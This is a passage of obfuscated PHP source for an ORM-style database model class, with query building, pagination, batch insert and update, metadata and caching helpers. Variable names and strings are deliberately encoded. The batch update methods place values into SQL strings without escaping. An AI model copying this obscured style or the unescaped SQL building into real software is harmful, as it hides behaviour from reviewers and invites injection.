function where($ÄËºÊ, $¡ÏİªÔ = null) { $úïïÃç¿ =& $_SERVER[«òÑğ]; if (!is_null($¡ÏİªÔ) && is_string($ÄËºÊ)) { if (!is_array($¡ÏİªÔ)) { $¡ÏİªÔ = func_get_args(); array_shift($¡ÏİªÔ); } $¡ÏİªÔ = array_map(array($this->db, $úïïÃç¿[421]), $¡ÏİªÔ); $ÄËºÊ = vsprintf($ÄËºÊ, $¡ÏİªÔ); } elseif (is_object($ÄËºÊ)) { $ÄËºÊ = get_object_vars($ÄËºÊ); } elseif (is_array($ÄËºÊ)) { foreach ($ÄËºÊ as $¥—€ôÙŸ => $õıÀø¢«) { if ((is_numeric($¥—€ôÙŸ) || !$¥—€ôÙŸ) && is_string($õıÀø¢«)) { if (strpos($õıÀø¢«, $úïïÃç¿[428]) === 0) { continue; } think_trace($úïïÃç¿[429], $úïïÃç¿[12], $úïïÃç¿[49]); die; } } } if (is_string($ÄËºÊ) && $úïïÃç¿[12] != $ÄËºÊ) { $ßÖ¢€¤ = array(); $ßÖ¢€¤[$úïïÃç¿[430]] = $ÄËºÊ; $ÄËºÊ = $ßÖ¢€¤; } if (isset($this->options[$úïïÃç¿[355]])) { $this->options[$úïïÃç¿[355]] = array_merge($this->options[$úïïÃç¿[355]], $ÄËºÊ); } else { $this->options[$úïïÃç¿[355]] = $ÄËºÊ; } return $this; } public function limit($´ÎâÈ¯—, $ËÔšÑ­ = null) { $ÛùÀ‡¡• =& $_SERVER[«òÑğ]; $this->options[$ÛùÀ‡¡•[370]] = is_null($ËÔšÑ­) ? $´ÎâÈ¯— : $´ÎâÈ¯— . $ÛùÀ‡¡•[50] . $ËÔšÑ­; return $this; } public function page($¨µŠÄÇ, $§‡†‚Â‡ = null) { $ÏŞÖï =& $_SERVER[«òÑğ]; $this->options[$ÏŞÖï[431]] = is_null($§‡†‚Â‡) ? $¨µŠÄÇ : $¨µŠÄÇ . $ÏŞÖï[50] . $§‡†‚Â‡; return $this; } public function comment($ûŠÑÁğë) { $this->options[$_SERVER[«òÑğ][432]] = $ûŠÑÁğë; return $this; } public function setProperty($ğ¢îÎº€, $èœÛ¬†Û) { if (property_exists($this, $ğ¢îÎº€)) { $this->{$ğ¢îÎº€} = $èœÛ¬†Û; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\151\146\171\x54\x69\x6d\145", "\x74\151\x6d\145", "\151\x6e\x73\145\x72\164\54\165\x70\144\141\x74\145", "\x66\x75\156\143\x74\x69\x6f\156"), array("\143\x72\145\x61\164\145\x54\151\155\145", "\164\151\x6d\145", "\x69\x6e\163\x65\x72\164", "\146\x75\156\143\x74\x69\157\x6e")); public function setDataAuto($‰ò¡’¸–) { $this->dataAuto = $‰ò¡’¸–; } public function __construct($•£©âò = '', $ ÎºÓÛä = '', $Ô€£õ¶Í = '') { parent::__construct($•£©âò, $ ÎºÓÛä, $Ô€£õ¶Í); } protected $tableMeta = array(); protected function _beforeInsert(&$îÔÈ§‹ô, $Ş•¿™ò) { $‹×Û©© =& $_SERVER[«òÑğ]; if (!$this->checkDataAutoHas($‹×Û©©[433])) { return; } $this->dataBeforeFilter($îÔÈ§‹ô, $‹×Û©©[433]); } protected function _beforeUpdate(&$Ë†Û üº, $¢¹à›Öƒ) { $¸‹óˆè¥ =& $_SERVER[«òÑğ]; if (!$this->checkDataAutoHas($¸‹óˆè¥[434])) { return; } $this->dataBeforeFilter($Ë†Û üº, $¸‹óˆè¥[434]); } protected function _afterSelect(&$ƒµÙÇÀ‰, $šƒËüşÈ) { if (!is_array($ƒµÙÇÀ‰)) { return; } if (!$this->checkDataAutoHas($_SERVER[«òÑğ][435])) { return; } foreach ($ƒµÙÇÀ‰ as &$™²ÊÅ™) { $this->dataAfterFilter($™²ÊÅ™); } unset($™²ÊÅ™); } protected function _afterFind(&$Ş¤áè˜, $¢±Á™¼«) { if (!is_array($Ş¤áè˜)) { return; } if (!$this->checkDataAutoHas($_SERVER[«òÑğ][435])) { return; } $this->dataAfterFilter($Ş¤áè˜); } public static function textEncode($è˜†Ëå) { if (!$è˜†Ëå) { return $è˜†Ëå; } $©Ş°…×Ÿ = json_encode($è˜†Ëå); $©Ş°…×Ÿ = preg_replace_callback($_SERVER[«òÑğ][436], function ($Ó¹âŠÃ») { return addslashes($Ó¹âŠÃ»[0]); }, $©Ş°…×Ÿ); return json_decode($©Ş°…×Ÿ); } public static function textDecode($âÅÌ«éâ) { $´†’¯Èè =& $_SERVER[«òÑğ]; $°ïÓ¶íÉ = json_encode($âÅÌ«éâ); $°ïÓ¶íÉ = preg_replace_callback($´†’¯Èè[437], function ($ø¦Ñğó³) { return $_SERVER[«òÑğ][100]; }, $°ïÓ¶íÉ); return json_decode($°ïÓ¶íÉ); } public function setAutoIncrement($´ÓáÔ¤Ô) { $ôŞºŒßæ = array($this->getPk() => $´ÓáÔ¤Ô); $ÁñúËö¥ = $this->data($ôŞºŒßæ)->add(); if ($ÁñúËö¥) { $this->delete($ÁñúËö¥); } } public function getAutoIncrement() { $€¦Õ¤¡Å = $this->getTableName(); $µİ£ãöØ = $this->max($this->getPk()); $Î¤å•áœ = $this->query("\163\150\x6f\x77\x20\164\141\x62\154\145\40\163\164\x61\164\165\163\40\x77\x68\145\x72\x65\40\x4e\141\155\x65\75\47{$€¦Õ¤¡Å}\x27"); $Ô‹ÕõİÍ = $Î¤å•áœ[0][$_SERVER[«òÑğ][438]]; $’—Š¸·³ = max($µİ£ãöØ, $Ô‹ÕõİÍ); return $’—Š¸·³; } protected function _callBefore($¨ÊÆçÚ‚, $Öñæ…Üø) { return $this->cacheCallCheck($¨ÊÆçÚ‚, $Öñæ…Üø, !1); } protected function _callAfter($êİŸ‘åñ, $®°ÖÍÇé) { return $this->cacheCallCheck($êİŸ‘åñ, $®°ÖÍÇé, !0); } protected function cacheFunctionAlias($ûôÆ¡í) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ê’‡œ»–, $Õ™áêõ, $ İğªä = false) { $×™¢”™“ =& $_SERVER[«òÑğ]; $‚Õ±öß = $this->cacheFunctionAlias($Õ™áêõ); if (!$‚Õ±öß) { return; } foreach ($‚Õ±öß as $ıÀ®Ñşü => $ç¹øÂ™Ò) { $Õ½©¡É… = $ç¹øÂ™Ò[0]; $«„ö¡×ß = explode($×™¢”™“[50], $ç¹øÂ™Ò[1]); $¡‹‰Ó¦Ş = isset($ç¹øÂ™Ò[2]) ? $ç¹øÂ™Ò[2] : $×™¢”™“[12]; if ($ê’‡œ»– == $ıÀ®Ñşü) { return $this->cacheFunctionGet($ıÀ®Ñşü, $Õ½©¡É…, $¡‹‰Ó¦Ş); } if ($ İğªä && in_array($ê’‡œ»–, $«„ö¡×ß)) { $this->cacheFunctionClear($ıÀ®Ñşü, $Õ½©¡É…, $¡‹‰Ó¦Ş); } } } public function cacheFunctionGet($‡…»Ï, $éıõšØ, $¶Á‚’Ğ = '') { $œÖêóñ = $this->cacheKeyMake($‡…»Ï, $éıõšØ, $¶Á‚’Ğ); $üœ„¯²Š = Cache::get($œÖêóñ); if (!is_array($üœ„¯²Š)) { $üœ„¯²Š = call_user_func_array(array($this, $‡…»Ï), array($éıõšØ, !0)); Cache::set($œÖêóñ, $üœ„¯²Š); } return $üœ„¯²Š; } public function cacheFunctionClear($Ş†’ÏÁÂ, $½¦°¢ï¼, $ş’½Ëò³ = '') { $Ø–ŒÄ”Ó = $½¦°¢ï¼; if (!is_array($½¦°¢ï¼)) { $Ø–ŒÄ”Ó = array($½¦°¢ï¼); } foreach ($Ø–ŒÄ”Ó as $æÀè®í) { $ŠÙšßøÚ = $this->cacheKeyMake($Ş†’ÏÁÂ, $æÀè®í, $ş’½Ëò³); Cache::remove($ŠÙšßøÚ); } } public function cacheKeyMake($Ù‹Í­­®, $ŞÙã”ßŒ, $™»ºØ·÷) { $€—ïŸ¿ =& $_SERVER[«òÑğ]; if ($™»ºØ·÷) { $ŞÙã”ßŒ = $ŞÙã”ßŒ . $€—ïŸ¿[439] . $™»ºØ·÷; } return get_class($this) . $€—ïŸ¿[11] . $Ù‹Í­­® . $€—ïŸ¿[440] . $ŞÙã”ßŒ; } protected function selectPageReset() { $™ƒÊ®¤ =& $_SERVER[«òÑğ]; if (isset($GLOBALS[$™ƒÊ®¤[441]])) { return; } $GLOBALS[$™ƒÊ®¤[441]] = isset($GLOBALS[$™ƒÊ®¤[7]][$™ƒÊ®¤[442]]) ? $GLOBALS[$™ƒÊ®¤[7]][$™ƒÊ®¤[442]] : !1; $GLOBALS[$™ƒÊ®¤[443]] = isset($GLOBALS[$™ƒÊ®¤[7]][$™ƒÊ®¤[431]]) ? $GLOBALS[$™ƒÊ®¤[7]][$™ƒÊ®¤[431]] : !1; $GLOBALS[$™ƒÊ®¤[7]][$™ƒÊ®¤[442]] = !1; $GLOBALS[$™ƒÊ®¤[7]][$™ƒÊ®¤[431]] = !1; } protected function selectPageRestore() { $¹¢Ùß˜ò =& $_SERVER[«òÑğ]; if (!isset($GLOBALS[$¹¢Ùß˜ò[441]])) { return; } $GLOBALS[$¹¢Ùß˜ò[7]][$¹¢Ùß˜ò[442]] = $GLOBALS[$¹¢Ùß˜ò[441]]; $GLOBALS[$¹¢Ùß˜ò[7]][$¹¢Ùß˜ò[431]] = $GLOBALS[$¹¢Ùß˜ò[443]]; if ($GLOBALS[$¹¢Ùß˜ò[7]][$¹¢Ùß˜ò[442]] === !1) { unset($GLOBALS[$¹¢Ùß˜ò[7]][$¹¢Ùß˜ò[442]]); } if ($GLOBALS[$¹¢Ùß˜ò[7]][$¹¢Ùß˜ò[431]] === !1) { unset($GLOBALS[$¹¢Ùß˜ò[7]][$¹¢Ùß˜ò[431]]); } unset($GLOBALS[$¹¢Ùß˜ò[441]]); unset($GLOBALS[$¹¢Ùß˜ò[443]]); } protected function selectPage($îåæôçÌ = 200, $½‘ÍĞÃ = 1) { $–ğËÓˆ =& $_SERVER[«òÑğ]; global $in; $úî†¡­Û = $this->optionsValue(); $‚ˆëå¨¦ = 50000; $îåæôçÌ = isset($in[$–ğËÓˆ[442]]) && $in[$–ğËÓˆ[442]] ? $in[$–ğËÓˆ[442]] : $îåæôçÌ; if ($îåæôçÌ === -1) { $in[$–ğËÓˆ[442]] = !1; $‚ˆëå¨¦ = 100000000; $îåæôçÌ = $‚ˆëå¨¦; } $¾ôüê’¼ = $úî†¡­Û; $¾ôüê’¼[$–ğËÓˆ[444]] = array(); $îåæôçÌ = intval($îåæôçÌ); $îåæôçÌ = $îåæôçÌ <= 5 ? 5 : ($îåæôçÌ >= $‚ˆëå¨¦ ? $‚ˆëå¨¦ : $îåæôçÌ); $½‘ÍĞÃ = intval(isset($in[$–ğËÓˆ[431]]) && $in[$–ğËÓˆ[431]] ? $in[$–ğËÓˆ[431]] : $½‘ÍĞÃ); $½‘ÍĞÃ = $½‘ÍĞÃ <= 1 ? 1 : $½‘ÍĞÃ; $à”È¤ßŸ = array(); $¥Ì¢øØ = 1; if ($½‘ÍĞÃ == 1 && $¥Ì¢øØ) { $this->optionsValue($úî†¡­Û); $à”È¤ßŸ = $this->page($½‘ÍĞÃ, $îåæôçÌ)->select(); $ãçûÅé = is_array($à”È¤ßŸ) ? count($à”È¤ßŸ) : 0; if ($ãçûÅé < $îåæôçÌ) { $Û¤¼ğğô = 1; } else { $this->optionsValue($¾ôüê’¼); $ãçûÅé = intval($this->count()); $Û¤¼ğğô = ceil($ãçûÅé / $îåæôçÌ); } } else { $this->optionsValue($¾ôüê’¼); $ãçûÅé = intval($this->count()); $Û¤¼ğğô = ceil($ãçûÅé / $îåæôçÌ); $½‘ÍĞÃ = $½‘ÍĞÃ >= $Û¤¼ğğô ? $Û¤¼ğğô : $½‘ÍĞÃ; $this->optionsValue($úî†¡­Û); $à”È¤ßŸ = $this->page($½‘ÍĞÃ, $îåæôçÌ)->select(); } if (!is_array($à”È¤ßŸ)) { $à”È¤ßŸ = array(); } if ($Û¤¼ğğô == 1) { $ãçûÅé = count($à”È¤ßŸ); } $¤ØÁÎ·µ = array($–ğËÓˆ[445] => array($–ğËÓˆ[446] => $ãçûÅé, $–ğËÓˆ[442] => $îåæôçÌ, $–ğËÓˆ[431] => $½‘ÍĞÃ, $–ğËÓˆ[447] => $Û¤¼ğğô), $–ğËÓˆ[448] => $à”È¤ßŸ); return $¤ØÁÎ·µ; } protected function checkLength($µĞõõŒ©, $Ş¤±™Âõ = 0, $ûËÛëı¥ = '') { $¾µ±å°é =& $_SERVER[«òÑğ]; $Ş¤±™Âõ = $Ş¤±™Âõ ? $Ş¤±™Âõ : 65536; if (!$µĞõõŒ© || strlen($µĞõõŒ©) < $Ş¤±™Âõ) { return; } $ûËÛëı¥ = $ûËÛëı¥ ? $ûËÛëı¥ . $¾µ±å°é[74] : $¾µ±å°é[12]; show_json($ûËÛëı¥ . LNG($¾µ±å°é[449]) . "\50{$Ş¤±™Âõ}\x29", !1); } protected function metaSet($Ş©×ÈÍ, $É‡Œ‰¡ = null, $úÑÊ«ãù = null) { $éæ¦œäÊ =& $_SERVER[«òÑğ]; if (!$this->tableMeta || !$Ş©×ÈÍ) { return !1; } $ä†÷Õ–§ = $this->tableMeta[$éæ¦œäÊ[450]]; $‡Şö…œû = $this->tableMeta[$éæ¦œäÊ[451]]; $Ûğø€×‚ = Model($‡Şö…œû); $±áŒÏÕÇ = array($ä†÷Õ–§ => $Ş©×ÈÍ, $éæ¦œäÊ[452] => $É‡Œ‰¡); if (is_null($É‡Œ‰¡)) { return $Ûğø€×‚->where(array($ä†÷Õ–§ => $Ş©×ÈÍ))->delete(); } if (is_null($úÑÊ«ãù) && is_string($É‡Œ‰¡)) { return $Ûğø€×‚->where($±áŒÏÕÇ)->delete(); } $Ÿªü…ë = is_array($É‡Œ‰¡) ? $É‡Œ‰¡ : array(); if (is_string($É‡Œ‰¡)) { $Ÿªü…ë[$É‡Œ‰¡] = $úÑÊ«ãù; } $¨ÇéÏ‚€ = array(); foreach ($Ÿªü…ë as $¨ìµˆ±È => $Ş›Äš) { if (is_null($Ş›Äš) && is_string($¨ìµˆ±È)) { $Ûğø€×‚->where(array($ä†÷Õ–§ => $Ş©×ÈÍ, $éæ¦œäÊ[452] => $¨ìµˆ±È))->delete(); continue; } $this->checkLength($Ş›Äš, !1, $‡Şö…œû . $éæ¦œäÊ[4] . $¨ìµˆ±È); $¨ÇéÏ‚€[] = array($ä†÷Õ–§ => $Ş©×ÈÍ, $éæ¦œäÊ[97] => $¨ìµˆ±È, $éæ¦œäÊ[453] => $Ş›Äš); } $·Üİ¼¼ = $éæ¦œäÊ[454] . $‡Şö…œû; CacheLock::lock($·Üİ¼¼); $Ûğø€×‚->where(array($ä†÷Õ–§ => $Ş©×ÈÍ))->addAll($¨ÇéÏ‚€, array(), !0); CacheLock::unlock($·Üİ¼¼); return !0; } public function metaGet($´áª’Ø—, $¸‘ÕÚÒ = false) { $²Äš‘ÖÈ =& $_SERVER[«òÑğ]; if (!$this->tableMeta) { return array(); } $ĞÑáñ½ = $this->tableMeta[$²Äš‘ÖÈ[450]]; $©Çµ¦áÁ = Model($this->tableMeta[$²Äš‘ÖÈ[451]]); if ($¸‘ÕÚÒ) { $ÔÃ€Ç†Õ = array($ĞÑáñ½ => $´áª’Ø—, $²Äš‘ÖÈ[97] => $¸‘ÕÚÒ); return $©Çµ¦áÁ->where($ÔÃ€Ç†Õ)->getField($²Äš‘ÖÈ[453]); } $ÔÃ€Ç†Õ = array($ĞÑáñ½ => $´áª’Ø—); $¼Å‘¦² = $©Çµ¦áÁ->field($²Äš‘ÖÈ[455])->where($ÔÃ€Ç†Õ)->select(); $¼Å‘¦² = array_to_keyvalue($¼Å‘¦², $²Äš‘ÖÈ[97], $²Äš‘ÖÈ[453]); return $¼Å‘¦²; } private function checkDataAutoHas($ÉĞ—ì—ê) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Ûè±»ãæ) { if (in_array($ÉĞ—ì—ê, explode($_SERVER[«òÑğ][50], $Ûè±»ãæ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Ÿ¬‡Óø¾, $…÷®À¤É) { $ûšöË¢Ó =& $_SERVER[«òÑğ]; if (!is_array($Ÿ¬‡Óø¾)) { return; } foreach ($this->dataAuto as $ê°Ö¾´ş) { $¢¸ŒÀ…© = $ê°Ö¾´ş[0]; if (!in_array($…÷®À¤É, explode($ûšöË¢Ó[50], $ê°Ö¾´ş[2]))) { continue; } switch (trim($ê°Ö¾´ş[3])) { case $ûšöË¢Ó[399]: case $ûšöË¢Ó[400]: $œäıèšê = $ê°Ö¾´ş[1]; $é­¥¼­¶ = isset($ê°Ö¾´ş[4]) ? (array) $ê°Ö¾´ş[4] : array(); if ($œäıèšê == $ûšöË¢Ó[207] && array_key_exists($¢¸ŒÀ…©, $Ÿ¬‡Óø¾)) { if (!$Ÿ¬‡Óø¾[$¢¸ŒÀ…©]) { unset($Ÿ¬‡Óø¾[$¢¸ŒÀ…©]); } break; } if (isset($Ÿ¬‡Óø¾[$¢¸ŒÀ…©])) { array_unshift($é­¥¼­¶, $Ÿ¬‡Óø¾[$¢¸ŒÀ…©]); } if ($ûšöË¢Ó[399] == $ê°Ö¾´ş[3]) { $Ÿ¬‡Óø¾[$¢¸ŒÀ…©] = call_user_func_array($œäıèšê, $é­¥¼­¶); } else { $Ÿ¬‡Óø¾[$¢¸ŒÀ…©] = call_user_func_array(array(&$this, $œäıèšê), $é­¥¼­¶); } break; case $ûšöË¢Ó[350]: if (isset($Ÿ¬‡Óø¾[$¢¸ŒÀ…©]) && $Ÿ¬‡Óø¾[$¢¸ŒÀ…©]) { $Ÿ¬‡Óø¾[$¢¸ŒÀ…©] = call_user_func_array(array(&$this, $ê°Ö¾´ş[1]), array($Ÿ¬‡Óø¾[$¢¸ŒÀ…©])); } break; case $ûšöË¢Ó[353]: $Ÿ¬‡Óø¾[$¢¸ŒÀ…©] = $Ÿ¬‡Óø¾[$ê°Ö¾´ş[1]]; break; case $ûšöË¢Ó[372]: if (isset($Ÿ¬‡Óø¾[$¢¸ŒÀ…©]) && !is_string($Ÿ¬‡Óø¾[$¢¸ŒÀ…©])) { $Ÿ¬‡Óø¾[$¢¸ŒÀ…©] = json_encode_force($Ÿ¬‡Óø¾[$¢¸ŒÀ…©]); } break; case $ûšöË¢Ó[401]: if ($Ÿ¬‡Óø¾[$¢¸ŒÀ…©] === $ûšöË¢Ó[12]) { unset($Ÿ¬‡Óø¾[$¢¸ŒÀ…©]); } break; case $ûšöË¢Ó[402]: $Ÿ¬‡Óø¾[$¢¸ŒÀ…©] = $ê°Ö¾´ş[1]; default: break; } } if ($…÷®À¤É == $ûšöË¢Ó[433]) { $“ä´êë = strtolower($this->db->getDbType()); if (strpos($“ä´êë, $ûšöË¢Ó[13]) !== 0) { return; } $¨°¹»Ì½ = $this->field(!0)->fields; $¢¡×Şç = $¨°¹»Ì½[$ûšöË¢Ó[332]]; if (isset($¨°¹»Ì½[$ûšöË¢Ó[331]])) { unset($¢¡×Şç[$¨°¹»Ì½[$ûšöË¢Ó[331]]]); } foreach ($¢¡×Şç as $½„æŒÜÄ => $…÷®À¤É) { if (!isset($Ÿ¬‡Óø¾[$½„æŒÜÄ])) { $Ÿ¬‡Óø¾[$½„æŒÜÄ] = $ûšöË¢Ó[12]; } } } } private function dataAfterFilter(&$¥åòºŠì) { $ÜÌÖ¨úÆ =& $_SERVER[«òÑğ]; foreach ($this->dataAuto as $™´ˆ˜ïş) { $â®“Ş¡Á = $™´ˆ˜ïş[0]; if (!isset($¥åòºŠì[$â®“Ş¡Á])) { continue; } if (!in_array($ÜÌÖ¨úÆ[435], explode($ÜÌÖ¨úÆ[50], $™´ˆ˜ïş[2]))) { continue; } switch (trim($™´ˆ˜ïş[3])) { case $ÜÌÖ¨úÆ[399]: case $ÜÌÖ¨úÆ[400]: $£ÆĞÅœÁ = isset($™´ˆ˜ïş[4]) ? (array) $™´ˆ˜ïş[4] : array(); array_unshift($£ÆĞÅœÁ, $¥åòºŠì[$â®“Ş¡Á]); if (isset($™´ˆ˜ïş[4]) && $™´ˆ˜ïş[4] == $ÜÌÖ¨úÆ[456]) { $£ÆĞÅœÁ = array($¥åòºŠì[$â®“Ş¡Á]); } if ($ÜÌÖ¨úÆ[399] == $™´ˆ˜ïş[3]) { $¥åòºŠì[$â®“Ş¡Á] = call_user_func_array($™´ˆ˜ïş[1], $£ÆĞÅœÁ); } else { $¥åòºŠì[$â®“Ş¡Á] = call_user_func_array(array(&$this, $™´ˆ˜ïş[1]), $£ÆĞÅœÁ); } break; case $ÜÌÖ¨úÆ[350]: if (isset($¥åòºŠì[$â®“Ş¡Á]) && $¥åòºŠì[$â®“Ş¡Á]) { $¥åòºŠì[$â®“Ş¡Á] = call_user_func_array(array(&$this, $™´ˆ˜ïş[1]), array($¥åòºŠì[$â®“Ş¡Á])); } break; case $ÜÌÖ¨úÆ[353]: $¥åòºŠì[$â®“Ş¡Á] = $¥åòºŠì[$™´ˆ˜ïş[1]]; break; case $ÜÌÖ¨úÆ[372]: $÷ƒ¹ˆ‹¬ = $¥åòºŠì[$â®“Ş¡Á]; $¥åòºŠì[$â®“Ş¡Á] = json_decode($÷ƒ¹ˆ‹¬, !0); if (is_null($¥åòºŠì[$â®“Ş¡Á])) { $¥åòºŠì[$â®“Ş¡Á] = $÷ƒ¹ˆ‹¬; } break; case $ÜÌÖ¨úÆ[401]: if ($¥åòºŠì[$â®“Ş¡Á] === $ÜÌÖ¨úÆ[12]) { unset($¥åòºŠì[$â®“Ş¡Á]); } break; case $ÜÌÖ¨úÆ[402]: $¥åòºŠì[$â®“Ş¡Á] = $™´ˆ˜ïş[1]; break; default: break; } } } public function saveAll($—Ÿœ©ô¥) { $üı­ü§Ş =& $_SERVER[«òÑğ]; $Ùşòºãµ = $this->tablePrefix . $this->tableName; $˜ÙŞ±Ù = self::SQL_WHERE_IN_CHUNK; $—Ÿœ©ô¥ = is_array($—Ÿœ©ô¥) ? $—Ÿœ©ô¥ : array(); $ÅÍ­ŒÈæ = $üı­ü§Ş[457]; $ï²á³Ò = 0; $ÛÏÖ·ÎÈ = array(); $Ê†àĞìƒ = count($—Ÿœ©ô¥); for ($Á¥éëş = 0; $Á¥éëş < $Ê†àĞìƒ; $Á¥éëş++) { $Â†ÔÌ³ = $—Ÿœ©ô¥[$Á¥éëş]; if (!is_array($Â†ÔÌ³) || count($Â†ÔÌ³) != 4) { continue; } $Ü·‘‰ƒŒ = "\125\120\104\101\x54\x45\40\140{$Ùşòºãµ}\140\x20\123\x45\x54\x20{$Â†ÔÌ³[2]}\x20\x3d\x20\x43\x41\123\x45\x20{$Â†ÔÌ³[0]}\x20\12"; if ($ï²á³Ò == 0) { $ÅÍ­ŒÈæ = $Ü·‘‰ƒŒ; } $ÛÏÖ·ÎÈ[] = $üı­ü§Ş[121] . $Â†ÔÌ³[1] . $üı­ü§Ş[121]; $ï²á³Ò++; $ÅÍ­ŒÈæ .= "\40\x57\x48\x45\x4e\40\x27{$Â†ÔÌ³[1]}\x27\40\124\x48\x45\116\40\x27{$Â†ÔÌ³[3]}\x27\40\xa"; if ($ï²á³Ò == $˜ÙŞ±Ù || $Á¥éëş == $Ê†àĞìƒ - 1) { $Óî‰×şÑ = implode($üı­ü§Ş[50], $ÛÏÖ·ÎÈ); $ÅÍ­ŒÈæ .= "\x20\x45\116\104\x20\40\127\110\105\x52\105\x20{$Â†ÔÌ³[0]}\40\111\x4e\40\50{$Óî‰×şÑ}\51\40"; $this->execute($ÅÍ­ŒÈæ); $ï²á³Ò = 0; $ÅÍ­ŒÈæ = $Ü·‘‰ƒŒ; $this->chunkEventCheck(count($ÛÏÖ·ÎÈ)); $ÛÏÖ·ÎÈ = array(); } } $this->chunkEventSet(); } public function saveAllEach($şóâŞÃ) { $Ì Ç¡‡ç =& $_SERVER[«òÑğ]; $Œû·ñöç = $this->tablePrefix . $this->tableName; foreach ($şóâŞÃ as $‹Æ™ß¤È) { if (!is_array($‹Æ™ß¤È) || count($‹Æ™ß¤È) != 4) { continue; } $Õ“ãÄïù = $‹Æ™ß¤È[0] . $Ì Ç¡‡ç[458] . $‹Æ™ß¤È[1] . $Ì Ç¡‡ç[121]; $ÆœØñ = $‹Æ™ß¤È[2] . $Ì Ç¡‡ç[458] . $‹Æ™ß¤È[3] . $Ì Ç¡‡ç[121]; $‡ó¬ŞÆ = "\165\160\x64\141\164\145\x20{$Œû·ñöç}\x20\163\x65\x74\x20{$ÆœØñ}\40\x77\150\x65\x72\x65\x20{$Õ“ãÄïù}\x3b"; $this->execute($‡ó¬ŞÆ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($™Î°÷¥ò = false, $Ğûú¯Ëˆ = false) { $this->_chunkEvent = $™Î°÷¥ò; $this->_chunkEventParam = $Ğûú¯Ëˆ; } private function chunkEventCheck($üåÀÉæ°) { if (!$this->_chunkEvent) { return; } $å¨˜†©¬ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $å¨˜†©¬[$_SERVER[«òÑğ][459]] = $üåÀÉæ°; Hook::trigger($this->_chunkEvent, $å¨˜†©¬); } public function addAll($¾æâîğ, $ßÄ”³œï = array(), $„èÂŒÆŒ = false) { $ÆŸ£À¢ =& $_SERVER[«òÑğ]; ignore_timeout(); $êíÚ„Š– = self::SQL_WHERE_IN_CHUNK; if (empty($¾æâîğ)) { $this->error = think_lang($ÆŸ£À¢[351]); return !1; } $ßÄ”³œï = $this->_parseOptions($ßÄ”³œï); foreach ($¾æâîğ as $Ôæú˜Ó => $È³ü·ô¹) { $¾æâîğ[$Ôæú˜Ó] = $this->_facade($È³ü·ô¹); $this->_beforeInsert($¾æâîğ[$Ôæú˜Ó], $ßÄ”³œï); } if (method_exists($this->db, $ÆŸ£À¢[352])) { for ($ä÷éëè = 0; $ä÷éëè < count($¾æâîğ); $ä÷éëè += $êíÚ„Š–) { $Ñ™ÌÙÖ = array_slice($¾æâîğ, $ä÷éëè, $êíÚ„Š–); if (!is_array($Ñ™ÌÙÖ) || count($Ñ™ÌÙÖ) == 0) { break; } $¼ÔË”Î = $this->db->insertAll($Ñ™ÌÙÖ, $ßÄ”³œï, $„èÂŒÆŒ); $this->chunkEventCheck(count($Ñ™ÌÙÖ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¾æâîğ as $Ôæú˜Ó => $È³ü·ô¹) { $¼ÔË”Î = $this->db->insert($È³ü·ô¹, $ßÄ”³œï, $„èÂŒÆŒ); } $this->commit(); } if (!1 !== $¼ÔË”Î) { $ì³ØÀô€ = $this->getLastInsID(); if ($ì³ØÀô€) { return $ì³ØÀô€; } } return $¼ÔË”Î; } public function save($ßƒ×„·å = '', $ïûÀ¹í = array()) { $¤”Õ†Ü‚ =& $_SERVER[«òÑğ]; $àÎŠ“ä– = self::SQL_WHERE_IN_CHUNK; $¼ƒÀÄË = $this->optionsValue(); $Ê‡’ü = $this->findWhereField($¼ƒÀÄË); if (!$Ê‡’ü) { return parent::save($ßƒ×„·å, $ïûÀ¹í); } $ğĞÖ¥á· = 0; $Àà™ØÆŞ = $¼ƒÀÄË[$¤”Õ†Ü‚[355]][$Ê‡’ü][1]; $Àà™ØÆŞ = is_array($Àà™ØÆŞ) ? $Àà™ØÆŞ : array(); $óëÒ°³± = count($Àà™ØÆŞ); for ($–øŞÜÙş = 0; $–øŞÜÙş < $óëÒ°³±; $–øŞÜÙş += $àÎŠ“ä–) { $ìäôìÖ› = array_slice($Àà™ØÆŞ, $–øŞÜÙş, $àÎŠ“ä–); if (!is_array($ìäôìÖ›) || count($ìäôìÖ›) == 0) { break; } $¼ƒÀÄË[$¤”Õ†Ü‚[355]][$Ê‡’ü][1] = $ìäôìÖ›; $this->optionsValue($¼ƒÀÄË); $ğĞÖ¥á· += parent::save($ßƒ×„·å, $ïûÀ¹í); $this->chunkEventCheck(count($ìäôìÖ›)); } $this->chunkEventSet(); return $ğĞÖ¥á·; } public function add($¤‡ŒÌÖà = '', $èâºÖ‘† = array(), $Ïì÷ˆ¢ = false) { if ($this->addTaskStatus && is_array($¤‡ŒÌÖà)) { $this->addTaskData[] = $¤‡ŒÌÖà; return; } return parent::add($¤‡ŒÌÖà, $èâºÖ‘†, $Ïì÷ˆ¢); } public function parseWhereLike($óà…™¸¾, $–¤•Üç¨ = '', $î¡Ò¤ğ¤ = false, &$¤óúç· = false) { $æ¨ìÓ÷ú =& $_SERVER[«òÑğ]; $ê¨¹ò« = $GLOBALS[$æ¨ìÓ÷ú[6]][$æ¨ìÓ÷ú[460]]; if (!$ê¨¹ò«[$æ¨ìÓ÷ú[461]]) { return $óà…™¸¾; } if (!is_array($óà…™¸¾)) { return $óà…™¸¾; } $ß§÷¥‹ = array(); $ƒ»‚øş = 0; foreach ($óà…™¸¾ as $ë×¾ÛÕ¼ => $‚Çßêòû) { if (is_array($‚Çßêòû) && count($‚Çßêòû) == 2 && $‚Çßêòû[0] == $æ¨ìÓ÷ú[462] && is_string($‚Çßêòû[1]) && substr($‚Çßêòû[1], 0, 1) == $æ¨ìÓ÷ú[463] && substr($‚Çßêòû[1], strlen($‚Çßêòû[1]) - 1, 1) == $æ¨ìÓ÷ú[463]) { $¤óúç· = !0; $ÖĞ¸Ãå˜ = is_string($ë×¾ÛÕ¼) ? $ë×¾ÛÕ¼ : $–¤•Üç¨; $¶Ü½é» = substr($‚Çßêòû[1], 1, strlen($‚Çßêòû[1]) - 2); $¶Ü½é» = $this->db->escapeString($¶Ü½é»); if (!strpos($ÖĞ¸Ãå˜, 